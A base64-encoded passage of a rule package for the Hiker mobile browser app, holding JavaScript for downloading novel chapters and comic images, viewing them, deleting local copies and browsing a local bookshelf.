CAgICBjb2xfdHlwZTogXFxcImJpZ19iaWdfYmxhbmtfYmxvY2tcXFwiLFxcbiAgICB9LCB7XFxuICAgICAgICBjb2xfdHlwZTogXFxcImJpZ19iaWdfYmxhbmtfYmxvY2tcXFwiLFxcbiAgICB9LCB7XFxuICAgICAgICBjb2xfdHlwZTogXFxcImJpZ19iaWdfYmxhbmtfYmxvY2tcXFwiLFxcbiAgICB9LCB7XFxuICAgICAgICBjb2xfdHlwZTogXFxcImJpZ19iaWdfYmxhbmtfYmxvY2tcXFwiLFxcbiAgICB9LCB7XFxuICAgICAgICB0aXRsZTogJzxoMiBzdHlsZT1cXFwidGV4dC1hbGlnbjogY2VudGVyO1xcXCI+8J+UjuayoeacieaJvuWIsOebuOWFs+S5puexjTwvaDI+JyxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcbiAgICB9KTtcXG59XFxuc2V0UmVzdWx0KHNlYXJjaFJlc3VsdCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjZi7plb/mjIkv54K55Ye7XCIsXCJwYXRoXCI6XCJsb25nUHJlc3MuanNcIixcInJ1bGVcIjpcImpzOlxcbiQuZXhwb3J0cyA9IHtcXG4gICAgZGVsZXRlRmlsZUZvckJvb2socGF0aCkge1xcbiAgICAgICAgLy9yZXR1cm4gJChcXFwi5omA5pyJ55qEIOa8q+eUuy/lsI/or7Qg56ug6IqC5bCG6KKr5Yig6ZmkXFxcXG3noa7orqTliKDpmaTvvJ9cXFwiKS5jb25maXJtKChwYXRoKSA9PiB7XFxuICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgaWYgKEZpbGUuZGVsZXRlRmlsZXMocGF0aCkpIHtcXG4gICAgICAgICAgICBkZWxldGVJdGVtKHBhdGgpXFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXCI7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/liKDpmaTlpLHotKVcXFwiO1xcbiAgICAgICAgfVxcbiAgICAgICAgLy99LCBwYXRoKTtcXG4gICAgfSxcXG4gICAgZGVsZXRlRmlsZUZvclR4dChwYXRoKSB7XFxuICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgaWYgKEZpbGUuZGVsZXRlRmlsZXMocGF0aCkpIHtcXG4gICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXCJmaWxlOi8vXFxcIiArIHBhdGggKyBcXFwiLmpzb25cXFwiKSkge1xcbiAgICAgICAgICAgICAgICBGaWxlLmRlbGV0ZUZpbGVzKHBhdGggKyBcXFwiLmpzb25cXFwiKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgZGVsZXRlSXRlbShwYXRoKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5oiQ5YqfXFxcIjtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+WIoOmZpOWksei0pVxcXCI7XFxuICAgICAgICB9XFxuICAgIH0sXFxuICAgIHNpbmdsZUVudGVyKHBhZ2VVcmwsIHBhdGgpIHtcXG4gICAgICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcIik7XFxuICAgICAgICBsZXQgZGlycyA9IEZpbGUuZ2V0RmlsZVBhdGgocGF0aCwgXFxcImRpclxcXCIpO1xcbiAgICAgICAgaWYgKGRpcnMubGVuZ3RoID09PSAxKSB7XFxuICAgICAgICAgICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuICAgICAgICAgICAgbGV0IGZpID0gZGlyc1swXS5wYXRoO1xcbiAgICAgICAgICAgIGlmIChDb25maWcuZGVmX2lzQ29taWNDb21wYXRpYmxlID09PSBcXFwiMFxcXCIpIHtcXG4gICAgICAgICAgICAgICAgbGV0IGZpbGVsaXN0ID0gRmlsZS5nZXRGaWxlUGF0aChmaSk7XFxuICAgICAgICAgICAgICAgIGxldCBzaG9ydGVuID0gZmkucmVwbGFjZShnZXRQYXRoKFxcXCJoaWtlcjovL2ZpbGVzL1xcXCIpLnNsaWNlKDcpLCBcXFwiaGlrZXI6Ly9maWxlcy9cXFwiKTtcXG4gICAgICAgICAgICAgICAgbGV0IHBpY2xpc3QgPSBmaWxlbGlzdC5tYXAoKGl0ZW0sIGkpID0+IHNob3J0ZW4gKyBcXFwiL1xcXCIgKyAoaSArIDEpICsgXFxcIi5qcGdcXFwiKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJwaWNzOi8vXFxcIiArIHBpY2xpc3Quam9pbihcXFwiJiZcXFwiKTtcXG5cXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9jb21pY0NvbXBhdGlibGUudmlldyNhdXRvUGFnZSMjcmVhZFRoZW1lIz9wYXRoPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoZmkpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcmV0dXJuIHBhZ2VVcmwgKyBcXFwiP3J1bGU9XFxcIiArIE1ZX1JVTEUudGl0bGVcXG4gICAgICAgIH1cXG4gICAgfVxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiNmZy7kuIvovb3kuLvnqIvluo9cIixcInBhdGhcIjpcIm1haW5Eb3dubG9hZFwiLFwicnVsZVwiOlwiY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFwiKTtcXG5jb25zdCBUb29sID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvVG9vbC5qc1xcXCIpO1xcblxcblxcbiQuZXhwb3J0cy5ub3ZlbCA9IGZ1bmN0aW9uIG5vdmVsKGl0ZW0sIGluZm8sIG9yZGVyLCBNWV9JRCwgaW50ZXJydXB0KSB7XFxuICAgIGxldCBpZCA9IGluZm8uYm9va0lkID8gXFxcIiRcXFwiICsgaW5mby5ib29rSWQgOiBcXFwiXFxcIjtcXG4gICAgbGV0IG1haW5QYXRoID0gQ29uZmlnLm5vdmVsUGF0aCArIFxcXCIvXFxcIiArIGluZm8ucnVsZU5hbWUgKyBcXFwiL1xcXCIgKyBUb29sLnRleHRTaGllbGQoaW5mby5ib29rTmFtZSkgKyBpZCArIFxcXCIvXFxcIjtcXG4gICAgbGV0IGNoYXB0ZXJQYXRoID0gbWFpblBhdGggKyBvcmRlciArIFxcXCIkQSRcXFwiICsgVG9vbC50ZXh0U2hpZWxkKGl0ZW0udGl0bGUpICsgXFxcIi50eHRcXFwiO1xcbiAgICBsZXQgY29udGVudCA9IFxcXCJcXFwiO1xcbiAgICBpZiAoaW50ZXJydXB0ICYmIGdldE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiXFxcIikgPT09IFxcXCIxXFxcIikge1xcbiAgICAgICAgcmV0dXJuIC0xO1xcbiAgICB9XFxuICAgIHRyeSB7XFxuICAgICAgICBsZXQgc2V0UmVzdWx0ID0gZGF0YSA9PiB7XFxuICAgICAgICAgICAgY29udGVudCA9IGRhdGFbMF0udGl0bGUgfHwgXFxcIlxcXCI7XFxuICAgICAgICAgICAgaWYgKGRhdGEubGVuZ3RoID4gMSAmJiBkYXRhWzFdLnRpdGxlICYmIGRhdGFbMV0udGl0bGUubGVuZ3RoID4gY29udGVudC5sZW5ndGgpIHtcXG4gICAgICAgICAgICAgICAgY29udGVudCA9IGRhdGFbMV0udGl0bGU7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IGdldFJlc0NvZGUgPSAoKSA9PiB7XFxuICAgICAgICAgICAgcmV0dXJuIGZldGNoKGl0ZW0udXJsKTtcXG4gICAgICAgIH1cXG4gICAgICAgIGxldCBnZXRDb250ZW50ID0gbmV3IEZ1bmN0aW9uKFxcXCJpbnB1dFxcXCIsIFxcXCJ1cmxcXFwiLCBcXFwiaW5kZXhcXFwiLCBcXFwidGl0bGVcXFwiLCBcXFwic2V0UmVzdWx0XFxcIiwgXFxcImdldFJlc0NvZGVcXFwiLCBcXFwicmV0dXJuIFxcXCIgKyBpbmZvLnBhcnNlQ29kZSk7XFxuICAgICAgICBjb250ZW50ID0gZ2V0Q29udGVudChpdGVtLnVybCwgaXRlbS51cmwsIG9yZGVyLCBpdGVtLnRpdGxlLCBzZXRSZXN1bHQsIGdldFJlc0NvZGUpIHx8IGNvbnRlbnQgfHwgXFxcIlxcXCI7XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGUubWVzc2FnZSA9IFxcXCI85bCP6K+05q2j5paH6Kej5p6Q6ZSZ6K+vPiBcXFwiICsgZS5tZXNzYWdlO1xcbiAgICAgICAgdGhyb3cgZTtcXG4gICAgfVxcbiAgICBpZiAoIWNvbnRlbnQpIHtcXG4gICAgICAgIHRvYXN0KFxcXCLlsI/or7TkuLrnqbpcXFwiKTtcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwiPOWwj+ivtOato+aWh+ino+aekOmUmeivr++8muato+aWh+i/lOWbnuS4uuepuj5cXFwiKTtcXG4gICAgfVxcbiAgICBpZiAoaW5mby5ib29rVG9wUGljKSB7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIGxldCBib29rVG9wUGljID0gVG9vbC5oaWtlclBpYyhpbmZvLmJvb2tUb3BQaWMpO1xcbiAgICAgICAgICAgIFRvb2wucGljRG93bmxvYWQoYm9va1RvcFBpY1swXSwgbWFpblBhdGggKyBpbmZvLmJvb2tOYW1lICsgaWQgKyBcXFwiLmpwZ1xcXCIsIGJvb2tUb3BQaWNbMV0sIGluZm8uZGVjb2RlKTtcXG5cXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBsb2coXFxcIjzlsIHpnaLkuIvovb3plJnor68+IFxcXCIgKyBlLm1lc3NhZ2UpO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIEZpbGUuZmlsZVdyaXRlKGNoYXB0ZXJQYXRoLCBjb250ZW50LnJlcGxhY2UoLzxzY3JpcHQ+Lio/PFxcXFwvc2NyaXB0Pi9nbWksIFxcXCJcXFwiKS50cmltUmlnaHQoKSk7XFxuICAgIC8vRmlsZS5yZW5hbWVGaWxlKGNoYXB0ZXJQYXRoLCBvcmRlciArIFxcXCIkQSRcXFwiICsgaXRlbS50aXRsZSArIFxcXCIudHh0XFxcIik7XFxufVxcblxcbiQuZXhwb3J0cy5jb21pYyA9IGZ1bmN0aW9uIGNvbWljKGl0ZW0sIGluZm8sIG9yZGVyLCBNWV9JRCwgaW50ZXJydXB0KSB7XFxuICAgIGxldCBpZCA9IGluZm8uYm9va0lkID8gXFxcIiRcXFwiICsgaW5mby5ib29rSWQgOiBcXFwiXFxcIjtcXG4gICAgbGV0IG1haW5QYXRoID0gQ29uZmlnLmNvbWljUGF0aCArIFxcXCIvXFxcIiArIGluZm8ucnVsZU5hbWUgKyBcXFwiL1xcXCIgKyBUb29sLnRleHRTaGllbGQoaW5mby5ib29rTmFtZSkgKyBpZCArIFxcXCIvXFxcIjtcXG4gICAgbGV0IGNoYXB0ZXJQYXRoID0gbWFpblBhdGggKyBvcmRlciArIFxcXCIkQiRcXFwiICsgVG9vbC50ZXh0U2hpZWxkKGl0ZW0udGl0bGUpICsgXFxcIi9cXFwiO1xcbiAgICBsZXQgcGljTGlzdCA9IFtdO1xcbiAgICB0cnkge1xcbiAgICAgICAgbGV0IGdldFBpY0xpc3QgPSBuZXcgRnVuY3Rpb24oXFxcImlucHV0XFxcIiwgXFxcInVybFxcXCIsIFxcXCJpbmRleFxcXCIsIFxcXCJ0aXRsZVxcXCIsIFxcXCJyZXR1cm5cXFwiICsgaW5mby5wYXJzZUNvZGUpO1xcbiAgICAgICAgcGljTGlzdCA9IGdldFBpY0xpc3QoaXRlbS51cmwsIGl0ZW0udXJsLCBvcmRlciwgaXRlbS50aXRsZSk7XFxuICAgICAgICBpZiAodHlwZW9mIHBpY0xpc3QgPT09IFxcXCJzdHJpbmdcXFwiKSB7XFxuICAgICAgICAgICAgcGljTGlzdCA9IHBpY0xpc3QucmVwbGFjZShcXFwicGljczovL1xcXCIsIFxcXCJcXFwiKS5zcGxpdChcXFwiJiZcXFwiKTtcXG4gICAgICAgIH1cXG4gICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgZS5tZXNzYWdlID0gXFxcIjzmvKvnlLvlm77niYfop6PmnpDplJnor68+IFxcXCIgKyBlLm1lc3NhZ2U7XFxuICAgICAgICB0aHJvdyBlO1xcbiAgICB9XFxuICAgIHBpY0xpc3QgPSBwaWNMaXN0LmZpbHRlcihwID0+IHApO1xcbiAgICBjb25zdCBMID0gcGljTGlzdC5sZW5ndGg7XFxuICAgIGlmIChMID09PSAwKSB7XFxuICAgICAgICB0b2FzdChcXFwi5Zu+54mH6ZO+5o6l5Li656m6XFxcIik7XFxuICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIjzmvKvnlLvlm77niYfop6PmnpDplJnor6/vvJrlm77niYfpk77mjqXov5Tlm57kuLrnqbo+XFxcIik7XFxuICAgIH1cXG4gICAgaWYgKGluZm8uYm9va1RvcFBpYykge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBsZXQgYm9va1RvcFBpYyA9IFRvb2wuaGlrZXJQaWMoaW5mby5ib29rVG9wUGljKTtcXG4gICAgICAgICAgICBUb29sLnBpY0Rvd25sb2FkKGJvb2tUb3BQaWNbMF0sIG1haW5QYXRoICsgaW5mby5ib29rTmFtZSArIGlkICsgXFxcIi5qcGdcXFwiLCBib29rVG9wUGljWzFdLCBpbmZvLmRlY29kZSk7XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgbG9nKFxcXCI85bCB6Z2i5LiL6L296ZSZ6K+vPiBcXFwiICsgZS5tZXNzYWdlKTtcXG4gICAgICAgIH1cXG4gICAgfVxcblxcbiAgICBsZXQgZXJyb3JOdW0gPSAwO1xcbiAgICBmb3IgKHZhciBpID0gMDsgaSA8IEw7IGkrKykge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBsZXQgcGljID0gVG9vbC5oaWtlclBpYyhwaWNMaXN0W2ldKTtcXG4gICAgICAgICAgICBUb29sLnBpY0Rvd25sb2FkKHBpY1swXSwgY2hhcHRlclBhdGggKyAoaSArIDEpICsgXFxcIi5qcGdcXFwiLCBwaWNbMV0sIGluZm8uZGVjb2RlKTtcXG4gICAgICAgICAgICBpZiAoaW50ZXJydXB0ICYmIGdldE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiXFxcIikgPT09IFxcXCIxXFxcIikge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGVycm9yTnVtID0gMDtcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBpZiAoZXJyb3JOdW0gPCAxMCkge1xcbiAgICAgICAgICAgICAgICBpLS07XFxuICAgICAgICAgICAgICAgIGVycm9yTnVtKys7XFxuICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIHRocm93IGU7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICB9XFxuXFxuICAgIEZpbGUucmVuYW1lRmlsZShjaGFwdGVyUGF0aCwgb3JkZXIgKyBcXFwiJEEkXFxcIiArIFRvb2wudGV4dFNoaWVsZChpdGVtLnRpdGxlKSk7XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI3Yu5ryr55S75YW85a65XCIsXCJwYXRoXCI6XCJjb21pY0NvbXBhdGlibGUudmlld1wiLFwicnVsZVwiOlwianM6XFxuY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG5zZXRQYWdlVGl0bGUoTVlfUEFSQU1TLnRpdGxlKTtcXG5sZXQgcGF0aD1kZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcInBhdGhcXFwiLE1ZX1BBUkFNUy5wYXRoKSk7XFxubGV0IGZpbGVsaXN0ID0gRmlsZS5nZXRGaWxlUGF0aChwYXRoKTtcXG5sZXQgcGljbGlzdCA9IGZpbGVsaXN0Lm1hcCgoaXRlbSwgaSkgPT4gKHtcXG4gICAgY29sX3R5cGU6IFxcXCJwaWNfMV9mdWxsXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgIHBpY191cmw6IHBhdGggKyBcXFwiL1xcXCIgKyAoaSArIDEpICsgXFxcIi5qcGdcXFwiXFxufSkpO1xcblxcbnNldFJlc3VsdChwaWNsaXN0KTtcXG5cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiN2LuS5puaetlwiLFwicGF0aFwiOlwiQm9va3JhY2sudmlld1wiLFwicnVsZVwiOlwianM6XFxuY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiRmlsZS5qc1xcXCIpO1xcbmNvbnN0IHJhbmsgPSAkLnJlcXVpcmUoXFxcImZpbGVSYW5rLmpzXFxcIik7XFxuY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFwiVG9vbC5qc1xcXCIpO1xcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiQ29uZmlnLmpzXFxcIik7XFxuXFxuKGZ1bmN0aW9uKCkge1xcbiAgICBsZXQgdHlwZSA9IE1ZX1BBUkFNUy50eXBlIHx8IGdldFBhcmFtKFxcXCJ0eXBlXFxcIiwgXFxcIlxcXCIpIHx8IFxcXCJjb21pY1xcXCI7XFxuICAgIGxldCBydWxlTmFtZSA9IFRvb2wudGV4dFNoaWVsZChNWV9QQVJBTVMucnVsZU5hbWUgfHwgZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJydWxlTmFtZVxcXCIpKSk7XFxuICAgIGlmICghcnVsZU5hbWUpIHtcXG4gICAgICAgIHRvYXN0KFxcXCLor7fkvKDlhaXop4TliJnlkI1cXFwiKTtcXG4gICAgICAgIGJhY2soZmFsc2UpO1xcbiAgICB9XFxuICAgIGlmICghW1xcXCJjb21pY1xcXCIsIFxcXCJub3ZlbFxcXCJdLmluY2x1ZGVzKHR5cGUpKSB7XFxuICAgICAgICB0b2FzdChcXFwi6K+35Lyg5YWl5q2j56Gu55qEdHlwZTpjb21pYyBub3ZlbFxcXCIpO1xcbiAgICAgICAgYmFjayhmYWxzZSk7XFxuICAgIH1cXG4gICAgc2V0UGFnZVRpdGxlKHJ1bGVOYW1lICsgXFxcInzmnKzlnLDkuabmnrZcXFwiKTtcXG4gICAgbGV0IGxheW91dCA9IFtdO1xcbiAgICBsZXQgcGF0aCA9IENvbmZpZ1t0eXBlICsgXFxcIlBhdGhcXFwiXSArIHJ1bGVOYW1lO1xcbiAgICBsZXQgY29sX3R5cGUgPSBnZXRJdGVtKFxcXCJib29rcmFjazpjb2xfdHlwZVxcXCIsIFxcXCJtb3ZpZV8zX21hcnF1ZWVcXFwiKTtcXG4gICAgbGV0IHJhbmtNZXRob2QgPSBnZXRJdGVtKFxcXCJib29rcmFjazpyYW5rTWV0aG9kXFxcIiwgXFxcIuezu+e7n1xcXCIpO1xcbiAgICBsZXQgcmFua0lzUmV2ZXJzZSA9IGdldEl0ZW0oXFxcImJvb2tyYWNrOnJhbmtJc1JldmVyc2VcXFwiLCBcXFwiXFxcIik7XFxuXFxuICAgIGxldCBjb2xUeXBlcyA9IFtcXFwibW92aWVfMVxcXCIsIFxcXCJtb3ZpZV8yXFxcIiwgXFxcIm1vdmllXzNfbWFycXVlZVxcXCIsIFxcXCJtb3ZpZV8xX3ZlcnRpY2FsX3BpY1xcXCIsIFxcXCJwaWNfMlxcXCIsIFxcXCJwaWNfM1xcXCIsIFxcXCJwaWNfM19zcXVhcmVcXFwiLCBcXFwicGljXzJfY2FyZFxcXCJdO1xcbiAgICBcXG4gICAgbGV0IHJhbmtNZXRob2RzID0gW1xcXCLns7vnu59cXFwiLCBcXFwi5aSn5bCPXFxcIiwgXFxcIuWQjeensFxcXCIsIFxcXCLml7bpl7RcXFwiXTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdXJsOiAnXFxcImhpa2VyOi8vc2VhcmNoP3M9XFxcIitpbnB1dCcsXFxuICAgICAgICBkZXNjOiBcXFwi5pCc5L2g5oOz6KaB55qEI1xcXCIgKyB0eXBlICsgXFxcIiMuLi4uLi5cXFwiLFxcbiAgICAgICAgdGl0bGU6IFxcXCLwn5SNXFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwiaW5wdXRcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBydWxlczogJC50b1N0cmluZygocnVsZU5hbWUsIHR5cGUpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IGFycjEgPSBbe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJ0aXRsZVxcXCI6IHJ1bGVOYW1lLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJzZWFyY2hfdXJsXFxcIjogXFxcImhpa2VyOi8vZW1wdHk/aXNBbGw9MSZzZWFyY2hUZXJtcz0qKiZ0eXBlPVxcXCIgKyB0eXBlLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJzZWFyY2hGaW5kXFxcIjogXFxcImpzOiQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL1NlYXJjaC52aWV3P3J1bGU9JytNWV9SVUxFLl90aXRsZSk7XFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfV07XFxuICAgICAgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkoYXJyMSk7XFxuICAgICAgICAgICAgfSwgcnVsZU5hbWUsIHR5cGUpLFxcbiAgICAgICAgICAgIC8qZGVmYXVsdFZhbHVlOiBnZXRNeVZhcignc2VhcmNoS2V5JywgJycpLFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiBcXFwicHV0TXlWYXIoJ3NlYXJjaEtleScsaW5wdXQpXFxcIiovXFxuICAgICAgICB9XFxuICAgIH0pO1xcblxcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIvCfp6lcXFwiLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJmbGV4X2J1dHRvblxcXCIsXFxuICAgICAgICB1cmw6ICQoY29sVHlwZXMubWFwKHY9PnY9PT1jb2xfdHlwZT9cXFwi4oCc4oCcXFxcIit2K1xcXCLigJ3igJ1cXFwiOnYpKS5zZWxlY3QoKG5hbWUpID0+IHtcXG4gICAgICAgICAgICBpZigv4oCc4oCcLio/4oCd4oCdLy50ZXN0KGlucHV0KSkgcmV0dXJuO1xcbiAgICAgICAgICAgIHNldEl0ZW0oXFxcImJvb2tyYWNrOmNvbF90eXBlXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICB9KVxcbiAgICB9KTtcXG4gICAgZm9yIChsZXQgbmFtZSBvZiByYW5rTWV0aG9kcykge1xcbiAgICAgICAgbGV0IGEgPSByYW5rTWV0aG9kID09PSBuYW1lO1xcbiAgICAgICAgbGV0IHRpdGxlYSA9IGEgPyBcXFwi4oCY4oCYXFxcIiArIG5hbWUgKyBcXFwi4oCZ4oCZXFxcIiA6IG5hbWU7XFxuICAgICAgICBsZXQgdGl0bGViID0gXFxcIlxcXCI7XFxuICAgICAgICBpZiAoYSkge1xcbiAgICAgICAgICAgIHRpdGxlYiA9ICFyYW5rSXNSZXZlcnNlID8gXFxcIuKGk1xcXCIgOiBcXFwi4oaRXFxcIjtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgdGl0bGViID0gXFxcIuKGlVxcXCI7XFxuICAgICAgICB9XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlYSArIHRpdGxlYixcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImZsZXhfYnV0dG9uXFxcIixcXG4gICAgICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKG5hbWUpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHJhbmtNZXRob2QgPSBnZXRJdGVtKFxcXCJib29rcmFjazpyYW5rTWV0aG9kXFxcIiwgXFxcIuezu+e7n1xcXCIpO1xcbiAgICAgICAgICAgICAgICBsZXQgcmFua0lzUmV2ZXJzZSA9IGdldEl0ZW0oXFxcImJvb2tyYWNrOnJhbmtJc1JldmVyc2VcXFwiLCBcXFwiXFxcIik7XFxuXFxuICAgICAgICAgICAgICAgIGlmIChyYW5rTWV0aG9kID09PSBuYW1lKSB7XFxuICAgICAgICAgICAgICAgICAgICBpZiAocmFua0lzUmV2ZXJzZSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhbmtJc1JldmVyc2UgPSBcXFwiXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmFua0lzUmV2ZXJzZSA9IFxcXCIxXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIH1cXG5cXG4gICAgICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcImJvb2tyYWNrOnJhbmtJc1JldmVyc2VcXFwiLCByYW5rSXNSZXZlcnNlKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcImJvb2tyYWNrOnJhbmtJc1JldmVyc2VcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICBzZXRJdGVtKFxcXCJib29rcmFjazpyYW5rTWV0aG9kXFxcIiwgbmFtZSk7XFxuXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgIH0sIG5hbWUpXFxuICAgICAgICB9KTtcXG4gICAgfVxcbiAgICBsZXQgcmFua01ldGhvZE1hcCA9IHtcXG4gICAgICAgIFxcXCLns7vnu59cXFwiOiBcXFwiXFxcIixcXG4gICAgICAgIFxcXCLlpKflsI9cXFwiOiBcXFwic2l6ZVxcXCIsXFxuICAgICAgICBcXFwi5ZCN56ewXFxcIjogXFxcIm5hbWVcXFwiLFxcbiAgICAgICAgXFxcIuaXtumXtFxcXCI6IFxcXCJ0aW1lXFxcIlxcbiAgICB9O1xcbiAgICBsZXQgYm9va0xpc3QgPSBbXTtcXG4gICAgbGV0IGxpc3QgPSByYW5rKEZpbGUuZ2V0RmlsZXMocGF0aCwgXFxcImRpclxcXCIpLCByYW5rTWV0aG9kTWFwW3JhbmtNZXRob2RdKTtcXG4gICAgaWYgKGxpc3QubGVuZ3RoID09PSAwKSB7XFxuICAgICAgICBib29rTGlzdC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBcXFwi5ZWl6YO95rKh5pyJ6IC2XFxcIi5iaWcoKSxcXG4gICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcblxcbiAgICB9XFxuICAgIGxldCBwYWdlVXJsID0gdHlwZSA9PT0gXFxcIm5vdmVsXFxcIiA/IFxcXCJoaWtlcjovL3BhZ2UvTm92ZWxCcm93c2VyLnZpZXdcXFwiIDogXFxcImhpa2VyOi8vcGFnZS9Db21pY0Jyb3dzZXIudmlld1xcXCI7XFxuICAgIGZvciAobGV0IGl0ZW0gb2YgbGlzdCkge1xcbiAgICAgICAgbGV0IHBpYyA9IGZpbGVFeGlzdChcXFwiZmlsZTovL1xcXCIgKyBpdGVtLmdldFBhdGgoKSArIFxcXCIvXFxcIiArIGl0ZW0uZ2V0TmFtZSgpICsgXFxcIi5qcGdcXFwiKSA/IGl0ZW0uZ2V0UGF0aCgpICsgXFxcIi9cXFwiICsgaXRlbS5nZXROYW1lKCkgKyBcXFwiLmpwZ1xcXC